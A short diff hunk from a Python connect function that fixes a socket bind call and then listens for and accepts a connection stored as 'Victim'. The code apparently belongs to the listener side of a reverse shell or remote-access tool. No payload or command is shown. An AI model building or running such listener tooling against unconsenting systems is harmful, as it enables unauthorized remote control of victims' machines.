@@ -16,7 +16,7 @@ def connect(Connection_Type: str, port: int, type: str):
 
     print("[" + blue + 'REPORT' + reset + "]  Making Connection")
     try:
-        Connection.bind('', int(port))
+        Connection.bind(('', int(port)))
         Connection.listen()
         Victim, Address = Connection.accept()
 
